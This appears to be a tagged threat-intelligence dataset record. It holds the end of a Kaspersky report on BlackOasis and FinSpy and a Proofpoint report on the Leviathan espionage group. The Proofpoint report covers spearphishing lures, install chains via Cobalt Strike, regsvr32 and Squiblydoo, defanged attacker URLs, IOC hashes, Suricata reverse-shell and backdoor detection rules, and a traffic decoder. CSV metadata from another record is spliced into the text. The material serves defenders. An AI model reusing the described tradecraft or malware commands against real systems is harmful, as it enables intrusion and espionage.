together with <CVE>CVE-2017-8759</CVE> in the attacks reported by <ORG>FIREEYE</ORG> in

<TIMESTAMP>September 2017</TIMESTAMP>. These IPs and other previous samples tie closely to the

<THREAT_ACTOR>BlackOasis</THREAT_ACTOR> <THREAT_ACTOR>APT</THREAT_ACTOR> cluster of <MALWARE>FINSPY</MALWARE> activity.

Targeting and Victims
<THREAT_ACTOR>BlackOasis</THREAT_ACTOR>’ interests span a wide gamut of figures involved in Middle

Eastern politics and verticals disproportionately relevant to the region.

This includes prominent figures in the <ORG>United Nations</ORG>, opposition

bloggers and activists, and regional news correspondents. <TIMESTAMP>During 2016</TIMESTAMP>,

we observed a heavy interest in <COUNTRY>Angola</COUNTRY>, exemplified by lure documents

indicating targets with suspected ties to <INDUSTRY>oil</INDUSTRY>, <INDUSTRY>money laundering</INDUSTRY>, and other

illicit activities. There is also an interest in international activists and think

tanks.

Victims of <THREAT_ACTOR>BlackOasis</THREAT_ACTOR> have been observed in the following countries:

<COUNTRY>Russia</COUNTRY>, <COUNTRY>Iraq</COUNTRY>, <COUNTRY>Afghanistan</COUNTRY>, <COUNTRY>Nigeria</COUNTRY>, <COUNTRY>Libya</COUNTRY>, <COUNTRY>Jordan</COUNTRY>, <COUNTRY>Tunisia</COUNTRY>, <COUNTRY>Saudi Arabia</COUNTRY>, <COUNTRY>Iran</COUNTRY>,

<COUNTRY>Netherlands</COUNTRY>, <COUNTRY>Bahrain</COUNTRY>, <COUNTRY>United Kingdom</COUNTRY> and <COUNTRY>Angola</COUNTRY>.

Conclusions
We estimate that the attack on <ORG>HackingTeam</ORG> <TIMESTAMP>in mid-2015</TIMESTAMP> left a gap on the

market for surveillance tools, which is now being filled by other

companies. One of these is <THREAT_ACTOR>Gamma International</THREAT_ACTOR> with their <MALWARE>FinFisher</MALWARE> suite

https://cdn.securelist.com/files/2017/10/171016-blackoasis-12.png


of tools. Although <THREAT_ACTOR>Gamma International</THREAT_ACTOR> itself was hacked by Phineas

Fisher in <TIMESTAMP>2014</TIMESTAMP>, the breach was not as serious as it was in the case of

<ORG>HackingTeam</ORG>. Additionally, <THREAT_ACTOR>Gamma</THREAT_ACTOR> had two years to recover from the

attack and pick up the pace.

We believe the number of attacks relying on <MALWARE>FinFisher</MALWARE> software, supported

by zero day exploits such as the ones described here will continue to

grow.

What does it mean for everyone and how to defend against such attacks,

including zero-day exploits?

For <CVE>CVE-2017-11292</CVE> and other similar vulnerabilities, one can use the

killbit for <SOFTWARE>Flash</SOFTWARE> within their organizations to disable it in any applications

that respect it.  Unfortunately, doing this system-wide is not easily done,

as <SOFTWARE>Flash</SOFTWARE> objects can be loaded in applications that potentially do not

follow the killbit. Additionally, this may break any other necessary

resources that rely on <SOFTWARE>Flash</SOFTWARE> and of course, it will not protect against

exploits for other third party software.

Deploying a multi-layered approach including access policies, anti-virus,

network monitoring and whitelisting can help ensure customers are

protected against threats such as this.  Users of <ORG>Kaspersky</ORG> products are

protected as well against this threat by one of the following detections:

</p style=”margin-bottom:0!important”>

PDM:Exploit.Win32.Generic

HEUR:Exploit.SWF.Generic

HEUR:Exploit.MSOffice.Generic

More information about <THREAT_ACTOR>BlackOasis</THREAT_ACTOR> <THREAT_ACTOR>APT</THREAT_ACTOR> is available to customers of

<ORG>Kaspersky</ORG> Intelligence Reporting Service. Contact:

intelreports@kaspersky.com

Acknowledgements
We would like to thank the <ORG>Adobe Product Security Incident Response Team</ORG> (<ORG>PSIRT</ORG>) for working with us to identify and patch this vulnerability.

References
1. <ORG>Adobe</ORG> Bulletin https://helpx.adobe.com/security/products/flash-

player/apsb17-32.html

Indicators of compromise

https://answers.microsoft.com/en-us/windows/forum/windows_8-update/flashplayer-updates/cd258a3f-cd87-4ea9-bdb6-074d06ad491e?auth=1
mailto:intelreports@kaspersky.com
https://helpx.adobe.com/security/products/flash-player/apsb17-32.html


Share post on:

THERE ARE 2 COMMENTS

<IOC>4a49135d2ecc07085a8b7c5925a36c0a</IOC>

<IOC>89.45.67[.]107</IOC>

<ORG>ADOBE</ORG>  <THREAT_ACTOR>APT</THREAT_ACTOR>  <SOFTWARE>MICROSOFT WORD</SOFTWARE>

VULNERABILITIES AND EXPLOITS  ZERO-DAY EXPLOIT  

ZERO-DAY VULNERABILITIES

Related Posts

<IDENTITY>Ryan</IDENTITY>
Posted on <TIMESTAMP>October 16, 2017. 11:54 pm</TIMESTAMP>

Does EMET block the <SOFTWARE>flash</SOFTWARE> exploit?

REPLY

<IDENTITY>Faron Faulk</IDENTITY>
Posted on <TIMESTAMP>October 17, 2017. 5:04 pm</TIMESTAMP>

fixed 

https://portal.msrc.microsoft.com/en-US/security-

guidance/advisory/ADV170018

REPLY

    

The Festive
Complexities
of SIGINT-
Capable Threat
Actors

A simple
example of a
complex
cyberattack

An
(un)documented
Word feature
abused by
attackers

https://securelist.com/all?tag=31
https://securelist.com/all?tag=538
https://securelist.com/all?tag=172
https://securelist.com/all?tag=41
https://securelist.com/all?tag=923
https://securelist.com/all?tag=54
https://securelist.com/blackoasis-apt-and-new-targeted-attacks-leveraging-zero-day-exploit/82732/?replytocom=1584794#respond
https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/ADV170018
https://securelist.com/blackoasis-apt-and-new-targeted-attacks-leveraging-zero-day-exploit/82732/?replytocom=1588376#respond
https://securelist.com/the-festive-complexities-of-sigint-capable-threat-actors/82683/
https://securelist.com/a-simple-example-of-a-complex-cyberattack/82636/
https://securelist.com/an-undocumented-word-feature-abused-by-attackers/81899/",BlackOasis;APT;Gamma International;Gamma,Flash;Adobe Flash;flash;Microsoft Office;Flash Player 21.0.0.226;Windows;Macintosh;Linux;Chrome OS;Kaspersky Security Network;Office;ActiveX;MICROSOFT WORD,oil;money laundering,Kaspersky;Kaspersky Lab;Adobe;FIREEYE;HackingTeam;GReAT;United Nations;Adobe Product Security Incident Response Team;PSIRT;ADOBE,"June 2015;September 2017;May 2016;October 10, 2017;October 16, 2017. 2:28 pm;May 10, 2016;May 8, 2016;July 2015;February 2016;since June 2015;Sept 2017;Oct 2017;During 2016;in mid-2015;2014;October 16, 2017. 11:54 pm;October 17, 2017. 5:04 pm",FINSPY;FinFisher;FinSpy,Angola;Russia;Iraq;Afghanistan;Nigeria;Libya;Jordan;Tunisia;Saudi Arabia;Iran;Netherlands;Bahrain;United Kingdom,4a49135d2ecc07085a8b7c5925a36c0a;hxxp://89.45.67[.]107/rss/5uzosoff0u.iaf;hxxp://89.45.67[.]107/rss/mo.exe;mo.exe;d3d9.dll;89.45.67[.]107,Ryan;Faron Faulk,,,,,,,,CVE-2017-11292;CVE-2017-8759;CVE-2016-4117;CVE-2015-5119;CVE-2016-0984,21,20,2,19,21,11,14,7,2,0,0,0,0,0,0,0,16
Leviathan_Espionage_actor,"<TIMESTAMP>9/10/2018</TIMESTAMP> <THREAT_ACTOR>Leviathan</THREAT_ACTOR>: Espionage actor spearphishes maritime and defense targets

https://www.printfriendly.com/p/g/Dn7rsC 1/12

<TIMESTAMP>October 17, 2017</TIMESTAMP>

<THREAT_ACTOR>Leviathan</THREAT_ACTOR>: Espionage actor spearphishes maritime and defense targets
proofpoint.com/us/threat‑insight/post/leviathan‑espionage‑actor‑spearphishes‑maritime‑and‑defense‑targets

Overview

Proofpoint researchers are tracking an espionage actor targeting organizations and high‑value targets in
defense and government. Active <TIMESTAMP>since at least 2014</TIMESTAMP>, this actor has long‑standing interest in maritime industries,
naval defense contractors, and associated research institutions in the <COUNTRY>United States</COUNTRY> and <COUNTRY>Western Europe</COUNTRY>.

Key takeaways from this research include:

Industry targeting: The actor targets defense contractors, universities (particularly those with military
research ties), legal organizations [3] and government agencies [3]. The actor has particular interest in
naval industries including <INDUSTRY>shipbuilding</INDUSTRY> and related research
Geographical targeting: Targeting includes <COUNTRY>United States</COUNTRY>, <COUNTRY>Western Europe</COUNTRY>, and <COUNTRY>South China Sea</COUNTRY>
Tools: Custom JavaScript malware known as “<MALWARE>Orz</MALWARE>” and “<MALWARE>NanHaiShu</MALWARE>”, <MALWARE>Cobalt Strike</MALWARE>, the SeDll JavaScript
loader, and MockDll dll loader
Delivery: Emailed attachments and URLs, often employing a fraudulent lookalike domain and stolen
branding
Exploitation: <SOFTWARE>Microsoft Excel</SOFTWARE> and Word documents with macros (sometimes password‑protected), very
recent vulnerabilities such as <CVE>CVE‑2017‑0199</CVE> and <CVE>CVE‑2017‑8759</CVE>, and malicious <SOFTWARE>Microsoft Publisher</SOFTWARE>
files
Installation: <SOFTWARE>JavaScript</SOFTWARE>, JavaScript Scriptlets in XML, HTA, <SOFTWARE>PowerShell</SOFTWARE>, <TOOL>WMI</TOOL>, <TOOL>regsvr32</TOOL>, <MITRE_ATTACK>Squiblydoo</MITRE_ATTACK>
Lateral Movement: The actor sometimes utilizes access at one compromised organization to attack the
next. For example, compromised email accounts at one organization were used to send the next wave of
malicious attachments to potential victims in the same industry. Similarly the actor attempts to
compromise servers within victim organizations and use them for command and control (C&C) for their
malware.

This blog traces key activities connected to this actor and examines a number of their tools and techniques.
Campaigns and details are presented in reverse chronological order to highlight the group’s most recent
activities.

Delivery and Exploitation

<TIMESTAMP>September 2017</TIMESTAMP>

On <TIMESTAMP>September 15 and 19, 2017</TIMESTAMP>, Proofpoint detected and blocked spearphishing emails from this group targeting
a US shipbuilding company and a US university research center with military ties. Example emails used the
subject “Apply for internship position” and contained an attachment “<IOC>resume.rtf</IOC>”. Another attachment,
“<IOC>ARLUAS_FieldLog_2017‑08‑21.doc</IOC>” contained a “Torpedo recovery experiment” lure. The attachments
exploited <CVE>CVE‑2017‑8759</CVE> which was discovered and documented only five days prior to the campaign [1].

https://www.proofpoint.com/us/threat-insight/post/leviathan-espionage-actor-spearphishes-maritime-and-defense-targets
https://www.proofpoint.com/us/threat-reference/malware
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0199
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8759
https://www.proofpoint.com/us/threat-reference/spear-phishing


<TIMESTAMP>9/10/2018</TIMESTAMP> <THREAT_ACTOR>Leviathan</THREAT_ACTOR>: Espionage actor spearphishes maritime and defense targets

https://www.printfriendly.com/p/g/Dn7rsC 2/12

Figure 1: Example attachment <IOC>resume.rtf</IOC> from <TIMESTAMP>September 2017</TIMESTAMP> campaign

<TIMESTAMP>August 2017</TIMESTAMP>

<TIMESTAMP>Between August 2 and 4</TIMESTAMP>, the actor sent targeted spearphishing emails containing malicious URLs linking to
documents to multiple defense contractors. Some of this activity was documented and observed by a fellow
researcher [2]. Many of the documents, C&C domains, and payload domains abused the brand of a major
provider of ships, submarines, and other vessels with military applications. Some of the documents exploited
<CVE>CVE‑2017‑0199</CVE> to deliver the payload.

Figure 2: One of the documents involved in the campaign used <ORG>Microsoft</ORG> licensing lures purporting to be
from a well‑known shipbuilder (sha256:
<IOC>6f6ee01e9dc2d8c4c260ef4131fe88dc152e53ee8afd3e66e92d4e1bf5fd2e92</IOC>).

Other documents were <SOFTWARE>Microsoft Publisher</SOFTWARE> files that relied on social engineering. The potential victims were
lured into starting an embedded PowerPoint presentation, moving the mouse to trigger execution of an
embedded JavaScript [5], and then pressing “Enable” in a warning dialog to cause the payload download. The
Publisher files were poorly crafted, relied on multiple user interactions, and contained multiple grammatical and
typographic errors.



<TIMESTAMP>9/10/2018</TIMESTAMP> <THREAT_ACTOR>Leviathan</THREAT_ACTOR>: Espionage actor spearphishes maritime and defense targets

https://www.printfriendly.com/p/g/Dn7rsC 3/12

Figure 3: Publisher document delivered via a link in email is in Italian, and is a simple reuse of a
student’swork.

<TIMESTAMP>February 2015</TIMESTAMP>

<TIMESTAMP>From February to October of 2015</TIMESTAMP>, our colleagues at <ORG>F‑Secure</ORG> and <ORG>McAfee</ORG> reported on campaigns [3][4] by this
actor targeting <COUNTRY>South China Sea</COUNTRY> interests. During this time, the group utilized <SOFTWARE>Microsoft Excel</SOFTWARE> and <SOFTWARE>Word</SOFTWARE>
documents with macros to target the <ORG>Philippines Department of Justice</ORG>, <ORG>APEC</ORG> organizers, and an international
law firm. Targeting of these companies is different from that which we typically observe for this actor; however it
still centers around marine and naval issues as related to <COUNTRY>South China sea</COUNTRY> politics.

Figure 4: Example attachment “<IOC>DOJ Staff bonus  January 13, 2015.xls</IOC>”. Similar to this document attachment,
most of the attachments in this campaign did not contain meaningful content

<TIMESTAMP>November 2014</TIMESTAMP>

The period between <TIMESTAMP>November 2014</TIMESTAMP> and <TIMESTAMP>January 2015</TIMESTAMP> marked one of the earlier instances in which Proofpoint
observed persistent exploitation attempts by this actor. The actor generally emailed <SOFTWARE>Microsoft Excel</SOFTWARE> documents
with malicious macros to <COUNTRY>US</COUNTRY> universities with military interests, most frequently related to <ORG>THE Navy</ORG>. The actor
also occasionally used macro‑laden <SOFTWARE>Microsoft Word</SOFTWARE> documents to target other <COUNTRY>US</COUNTRY> research and development
organizations with military and intelligence ties during this period.

Emails were often very simple with a greeting and an attachment. On other occasions, it appears that the
attackers used highly topical lures based on current events or legitimate documents stolen from previous
victims. Lure topics included symposia, <ORG>the Navy</ORG>, <INDUSTRY>IT</INDUSTRY>, and relevant research.



<TIMESTAMP>9/10/2018</TIMESTAMP> <THREAT_ACTOR>Leviathan</THREAT_ACTOR>: Espionage actor spearphishes maritime and defense targets

https://www.printfriendly.com/p/g/Dn7rsC 4/12

Figure 5: Example Excel attachment “<IOC>2014 Accomplishments Input Template.xls</IOC>”

Installation

The actor continues to:

Innovate and modify the code that accomplishes the installation, while the backdoor code remains more
static
Use scripting languages such as JavaScript, JavaScript Scriptlets, VBScript, and XML
Use simple obfuscation such as base64, gzip compression, and insertion of garbage characters
Split functionality of the backdoor & code that establishes persistence for the backdoor into separate files
and scripts

Example 1: <IOC>Resume.rtf</IOC>

The “<IOC>resume.rtf</IOC>” file from the <TIMESTAMP>September 19, 2017</TIMESTAMP> attack retrieves the malicious SOAP WSDL definition named
“<IOC>readme.txt</IOC> “ using an anonymous FTP logon to the attacker’s server.

Figure 6: SOAP WSDL definition (“<IOC>readme.txt</IOC>“)

This definition in turn downloads a VBScript <IOC>favicon.ico</IOC> file, which then creates and runs two JavaScript files in
the %TMP% directory:

Figure 7: Code snipped showing VBScript dropping 2 JavaScript files



9/10/2018 <THREAT_ACTOR>Leviathan</THREAT_ACTOR>: Espionage actor spearphishes maritime and defense targets

https://www.printfriendly.com/p/g/Dn7rsC 5/12

The job of the smaller of the two JavaScripts is to establish a system autostart mechanism. It accomplishes this
by deobfuscating another script, link.js, into %TMP%. Link.js in turn creates a shortcut  file ""<IOC>Java(TM) Platform
SE Auto Updater.lnk</IOC>"" in the ""Startup"" special folder pointing to the main backdoor JavaScript.

Figure 8: Code for establishing persistence after reboot (autostart mechanism)

The job of the larger of the two JavaScripts is to download and execute the <MALWARE>Cobalt Strike</MALWARE> payload. It
accomplishes this by writing more code to rWug5n0PHUFjDFyb8k.js in the temporary directory, which then runs
a PowerShell command (obfuscated using garbage characters, base64 encoding, and Gzip compression). The
PowerShell is a default <MALWARE>Cobalt Strike</MALWARE> downloader.

Figure 9: PowerShell code downloading <MALWARE>Cobalt Strike</MALWARE>

Example 2: Malicious <SOFTWARE>Microsoft Publisher</SOFTWARE> document

The malicious script executed by the <SOFTWARE>Microsoft Publisher</SOFTWARE> file downloads and runs yet another JavaScript file,
0.js, hosted on the attacker‑controlled server:

Figure 10: Malicious script executed by the <SOFTWARE>Microsoft Publisher</SOFTWARE> file (sha256:
<IOC>305f331bfb1e97028f8c92cbcb1dff2741dcddacc76843e65f9b1ec5a66f52bc</IOC>)



<TIMESTAMP>9/10/2018</TIMESTAMP> <THREAT_ACTOR>Leviathan</THREAT_ACTOR>: Espionage actor spearphishes maritime and defense targets

https://www.printfriendly.com/p/g/Dn7rsC 6/12

Similar to the previous example (resume.rtf), the 0.js handles the system autostart mechanism via a shortcut file
""<IOC>office 365.lnk</IOC>"" in the ""Startup"" special folder. However, the shortcut abuses the “<MITRE_ATTACK>Squiblydoo</MITRE_ATTACK>” technique [6].
Moreover, the backdoor is not run directly but via an intermediary SeDll (see below).

0.js also downloads two additional files from the C&C server (green.ddd and green.tmp) The first of these files,
green.ddd, is an executable file internally named “<IOC>SEDll_Win32.dll</IOC>”. This is a known backdoor used by this actor
<TIMESTAMP>since 2014</TIMESTAMP> for the same purpose: decrypting and executing the final JavaScript backdoor “<MALWARE>Orz</MALWARE>”.

Tools

<MALWARE>NanHaiShu</MALWARE>

We have observed variants of this JavaScript backdoor used in various campaigns, including those publically
reported. The actor continues to improve and refine the malware by, for example, wrapping it inside an HTA
wrapper. Several good descriptions are available  in analyses from fellow researchers [3][4]. Basic functionality
includes:

Information gathering (computer name, user name, serial number, proxy server)
Downloading from URL
Executing other JavaScript
Registry, system, process, directory, file operations
SafeIE (change IE settings to reduce warnings about about malware activity)

Figure 11: Screenshot from <TIMESTAMP>2015</TIMESTAMP> version of the malware dropped by “<IOC>DOJ Staff bonus January 13, 2015.xls</IOC>”

<MALWARE>Orz</MALWARE>

We observed this backdoor in an <TIMESTAMP>August 2017</TIMESTAMP> campaign dropped by the <SOFTWARE>Microsoft Publisher</SOFTWARE> files,
as well as much <TIMESTAMP>earlier in 2014</TIMESTAMP>. We named it due to a variable name “<MALWARE>Orz</MALWARE>”, which is changed to “core” in the more recent
version. The actor consistently tweaks and improves this backdoor as well. The backdoor is a fairly involved
script malware. Its functionality includes:

Information gathering (IE version, OS version, OS 64‑bit/32‑bit, etc)
Overwriting registry settings to reduce malware visibility on system
Download file
Upload file
Execute a command with cscript
Execute JavaScript
Execute shell command
Execute a dll (via an embedded ‘MockDll')
Get proxy info
Get process list
Terminate process
Get drive info



<TIMESTAMP>9/10/2018</TIMESTAMP> <THREAT_ACTOR>Leviathan</THREAT_ACTOR>: Espionage actor spearphishes maritime and defense targets

https://www.printfriendly.com/p/g/Dn7rsC 7/12

GET request to a URL
POST request to a URL

Figure 12: Snippet of the <MALWARE>Orz</MALWARE> backdoor code delivered by the the <SOFTWARE>Microsoft Publisher</SOFTWARE> document. The URL
domain is a fraudulent lookalike domain.

There is an extensive configuration section at the top of the script. The ""jmpUrlList"" provides the initial C&C
servers, which are used to determine the secondary C&C server as well as additional commands to execute. It is
worth noting that the secondary C&C may be the same as the first. We have observed attacker‑controlled web
servers, compromised victim web servers, and <ORG>Technet</ORG> and <ORG>Pastebin</ORG> web pages used for the initial C&C.

The initial C&C response is parsed with a regex. The backdoor first looks for the secondary encoded C&C server
using the ""jmpRegex"" regex. Next, the backdoor looks for additional code to execute using the ""codeRegex""
regex. For additional code, we observed simple code blocks that provide a different upload/download
functionality.

Figure 13: The encoded response ""<IOC>vcmQx3ELgTyTyOVSvsm7wrBKwraFw8VFwCuL</IOC>"" in the image above
decodes to ""<IOC>hxxp://www.vitaminmain[.]info</IOC>"" which is the secondary C&C server for an older backdoor variant
(Decoder provided in Appendix).

MockDll

Some versions of the <MALWARE>Orz</MALWARE> backdoor have 32‑ and 64‑bit embedded DLLs, stored internally as base64 strings.
Their purpose is to simply run another binary. These are used as loaders for future executable payloads, using
the well‑known process hollowing technique. To use the MockDll, the backdoor creates a configuration .ini file



<TIMESTAMP>9/10/2018</TIMESTAMP> <THREAT_ACTOR>Leviathan</THREAT_ACTOR>: Espionage actor spearphishes maritime and defense targets

https://www.printfriendly.com/p/g/Dn7rsC 8/12

like that shown in Figure 14:

Figure 14: MockDll configuration file

mock: defaults to '<TOOL>regsvr32</TOOL>'

real: the dll, which is the ultimate goal to execute

args: arguments to the dll that will be executed, if any

outf: file in which to write results of the MockDll run

time: timeout defaults to 5

After the configuration file is created, the MockDll is executed with <TOOL>regsvr32</TOOL>. MockDll reads the mentioned .ini
config file to determine what to execute. It can log its execution results into a file specified by the “outf”
parameter, as shown in Figure 15:

Figure 15: Contents of the log file created by MockDll

SeDll

This DLL is used for decrypting and executing another JavaScript backdoor such as <MALWARE>Orz</MALWARE>. The DLL is registered
by the installer using <TOOL>regsvr32</TOOL>. The DllRegisterServer export is then called, which performs checks on the
commandline parameter. If the string “DR” is passed as an argument, or if the DLL is running in the active
session with a username that is not “system”, the final JavaScript backdoor is decoded using a custom base64
alphabet. This backdoor has to be present in the same directory as the dll, with a “.tmp” file extension. The
backdoor script is then executed using the IActiveScript and IActiveScriptParse32 COM interfaces.

Figure 16: Decoding and executing of the JavaScript backdoor

If those conditions are not met, it runs the following command line “""regsvr32 /s \""%s\"" DR __CIM__""” to register
the DLL, where %s is the path to the DLL. It tries to do this with the current user privileges, but if the privileges
cannot be adjusted it defaults to the available execution environment.

<MALWARE>Cobalt Strike</MALWARE>

This is a penetration testing tool. The attackers often abuse the free trial version.

Conclusion



<TIMESTAMP>9/10/2018</TIMESTAMP> <THREAT_ACTOR>Leviathan</THREAT_ACTOR>: Espionage actor spearphishes maritime and defense targets

https://www.printfriendly.com/p/g/Dn7rsC 9/12

This actor, whose espionage activities primarily focus on targets in the US and Western Europe with military ties,
has been active <TIMESTAMP>since at least 2014</TIMESTAMP>. The tools, techniques, and targets consistently connect their work,
particular given their attention to naval and maritime defense interests and use of custom backdoors. While
defense contractors and academic research centers with military ties should always be cognizant of the
potential for cyberattacks, organizations fitting their targeting profiles should be especially wary of legitimate‑
looking but unsolicited emails from outside entities. Appropriate layered defenses at the firewall, email gateway,
and endpoint can all help prevent the kinds of lateral movement we have observed with this actor, as well as the
compromise and abuse of systems via which this group expands its attack surface to other organizations.

References

[1] https://www.fireeye.com/blog/threat‑research/2017/09/zero‑day‑used‑to‑distribute‑finspy.html

[2] https://twitter.com/James_inthe_box/status/893525493059788800

[3] https://labsblog.f‑secure.com/2016/08/04/nanhaishu‑rating‑the‑south‑china‑sea/

[4] https://community.spiceworks.com/topic/1028936‑stealthy‑cyberespionage‑campaign‑attacks‑with‑social‑
engineering

[5] http://blog.trendmicro.com/trendlabs‑security‑intelligence/mouseover‑otlard‑gootkit/

[6] https://www.carbonblack.com/2016/04/28/threat‑advisory‑squiblydoo‑continues‑trend‑of‑attackers‑using‑
native‑os‑tools‑to‑live‑off‑the‑land/

Indicators of Compromise (IOCs)

IOC IOC
Type

Description

<IOC>cdf6e2e928a89cbb857e688055a25e37a8d8b8b90530bd52c8548fb544f66f1f</IOC> SHA256 Resume.rtf exploiting <CVE>CVE‑2017‑8759</CVE> (<TIMESTAMP>Sep 19, 2017</TIMESTAMP>)

<IOC>c7fa6f27ec4f4142ae591f2dd7c63d046431945f03c87dbed88d79f55180a46d</IOC> SHA256 <IOC>ARLUAS_FieldLog_2017‑08‑21.doc</IOC> exploiting <CVE>CVE‑2017‑8759</CVE> (<TIMESTAMP>Sep 19, 2017</TIMESTAMP>)

<IOC>ftp://185.106.120[.]206/pub/readme.txt</IOC> URL <IOC>Resume.rtf</IOC> downloading
scripts (<TIMESTAMP>Sep 19, 2017</TIMESTAMP>)

<IOC>hxxp://185.106.120[.]206/favicon.ico</IOC> URL <IOC>Resume.rtf</IOC> downloading
scripts (<TIMESTAMP>Sep 19, 2017</TIMESTAMP>)

<IOC>39c952c7e14b6be5a9cb1be3f05eafa22e1115806e927f4e2dc85d609bc0eb36</IOC> SHA256 <IOC>Favicon.ico</IOC> (<TIMESTAMP>Sep 19, 2017</TIMESTAMP>)

<IOC>5860ddc428ffa900258207e9c385f843a3472f2fbf252d2f6357d458646cf362</IOC> SHA256 <MALWARE>Cobalt Strike</MALWARE> (<TIMESTAMP>Sep 19, 2017</TIMESTAMP>)

<IOC>ced7ca9625543d3d3d09f70223cc19f0d99e21792854452df5ba84b3a59d17b8</IOC> SHA256 <IOC>20170720_final_pm_app‑2.doc</IOC> (<TIMESTAMP>August 2017</TIMESTAMP>)Document hash (<TIMESTAMP>August 2017</TIMESTAMP>)

<IOC>305f331bfb1e97028f8c92cbcb1dff2741dcddacc76843e65f9b1ec5a66f52bc</IOC> SHA256 Publisher hash (<TIMESTAMP>August 2017</TIMESTAMP>)

<IOC>bfc5c6817ff2cc4f3cd40f649e10cc9ae1e52139f35fdddbd32cb4d221368922</IOC> SHA256 MockDll 32‑bit (<TIMESTAMP>August 2017</TIMESTAMP>)

https://www.fireeye.com/blog/threat-research/2017/09/zero-day-used-to-distribute-finspy.html
https://twitter.com/James_inthe_box/status/893525493059788800
https://labsblog.f-secure.com/2016/08/04/nanhaishu-rating-the-south-china-sea/
https://community.spiceworks.com/topic/1028936-stealthy-cyberespionage-campaign-attacks-with-social-engineering
http://blog.trendmicro.com/trendlabs-security-intelligence/mouseover-otlard-gootkit/
https://www.carbonblack.com/2016/04/28/threat-advisory-squiblydoo-continues-trend-of-attackers-using-native-os-tools-to-live-off-the-land/


<TIMESTAMP>9/10/2018</TIMESTAMP> <THREAT_ACTOR>Leviathan</THREAT_ACTOR>: Espionage actor spearphishes maritime and defense targets

https://www.printfriendly.com/p/g/Dn7rsC 10/12

<IOC>80b931ab1798d7d8a8d63411861cee07e31bb9a68f595f579e11d3817cfc4aca</IOC> SHA256 MockDll 32‑bit (<TIMESTAMP>August 2017</TIMESTAMP>)

<IOC>146aa9a0ec013aa5bdba9ea9d29f59d48d43bc17c6a20b74bb8c521dbb5bc6f4</IOC> SHA256 <IOC>green.ddd</IOC> SeDll (<TIMESTAMP>August 2017</TIMESTAMP>)

<IOC>4029b43c7febd05e8bf013c1022244aaa238341ca44bbce2250667614c1a4932</IOC> SHA256 <IOC>2014 Accomplishments Input Template.xls</IOC> (<TIMESTAMP>December 2014</TIMESTAMP>)

<IOC>hxxp://www.vitaminmain[.]info</IOC> URL <MALWARE>Orz</MALWARE> secondary C2
(<TIMESTAMP>December 2014</TIMESTAMP>)

ET and ETPRO Suricata/Snort Coverage

2024192 | ET EXPLOIT Possible <CVE>CVE‑2017‑0199</CVE> HTA Inbound

2024196 | ET WEB_CLIENT HTA File containing Wscript.Shell Call ‑ Potential <CVE>CVE‑2017‑0199</CVE>

2022520 | ET POLICY Possible HTA Application Download

2024197 | ET CURRENT_EVENTS SUSPICIOUS MSXMLHTTP DL of HTA (Observed in <CVE>CVE‑2017‑0199</CVE>)

2024449 | ET CURRENT_EVENTS SUSPICIOUS Possible <CVE>CVE‑2017‑0199</CVE> IE7/NoCookie/Referer HTA dl

2814013 | ETPRO TROJAN <MALWARE>Meterpreter</MALWARE> or Other Reverse Shell SSL Cert

2023629 |  ET INFO Suspicious Empty SSL Certificate ‑ Observed in <MALWARE>Cobalt Strike</MALWARE>

2810628 | ETPRO TROJAN JavaScript Backdoor CnC Beacon M2 (b64 3)

2828317 | ETPRO TROJAN <MALWARE>Orz</MALWARE> JavaScript Backdoor Communicating with CnC

2828316 | ETPRO TROJAN <MALWARE>Orz</MALWARE> JavaScript Backdoor Sending Password to CnC

Appendix: <MALWARE>Orz</MALWARE> Traffic Decoder

var _keyStr = ""oMZF/W42VkcCbqOiPSajhnKtQws8NRAxr16XJpu=0mgE3THGLlvz9+5BDYd7feyUI"";

function decode (input) {

                       var output = """";

                       var chr1, chr2, chr3;

                       var enc1, enc2, enc3, enc4;

                       var i = 0;

                       input = input.replace(/[^A‑Za‑z0‑9\+\/\=]/g, """");

                       while (i < input.length) {

                                   enc1 = this._keyStr.indexOf(input.charAt(i++));

                                   enc2 = this._keyStr.indexOf(input.charAt(i++));

                                   enc3 = this._keyStr.indexOf(input.charAt(i++));

                                   enc4 = this._keyStr.indexOf(input.charAt(i++));

                                   chr1 = (enc1 << 2) | (enc2 >> 4);

                                   chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);

                                   chr3 = ((enc3 & 3) << 6) | enc4;



<TIMESTAMP>9/10/2018</TIMESTAMP> <THREAT_ACTOR>Leviathan</THREAT_ACTOR>: Espionage actor spearphishes maritime and defense targets

https://www.printfriendly.com/p/g/Dn7rsC 11/12

                                   output = output + String.fromCharCode(chr1);

                                   if (enc3 != 64) {

                                               output = output + String.fromCharCode(chr2);

                                   }

                                   if (enc4 != 64) {

                                               output = output + String.fromCharCode(chr3);

                                   }

                       }

                       output = this._utf8_decode(output);

                       return output;

           }

function _utf8_decode (utftext) {

                       var string = """";

                       var i = 0;

                       var c = c1 = c2 = 0;

                       while ( i < utftext.length ) {

                                   c = utftext.charCodeAt(i);

                                   if (c < 128) {

                                               string += String.fromCharCode(c);

                                               i++;

                                   } else if((c > 191) && (c < 224)) {

                                               c2 = utftext.charCodeAt(i+1);

                                               string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));

                                               i += 2;

                                   } else {

                                               c2 = utftext.charCodeAt(i+1);

                                               c3 = utftext.charCodeAt(i+2);

                                               string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));

                                               i += 3;

                                   }

                       }

                       return string;

           }

var decodeme =
""s2S9NF0GCBRBRvY9s2pzN5nHsBk+N2oT8KWvsKYpNBpzR4nTNvYGNuNdOFoDbZeTQtkm8unzAtq9wK+zCLII""

var res = decode(decodeme);



<TIMESTAMP>9/10/2018</TIMESTAMP> <THREAT_ACTOR>Leviathan</THREAT_ACTOR>: Espionage actor spearphishes maritime and defense targets

https://www.printfriendly.com/p/g/Dn7rsC 12/12

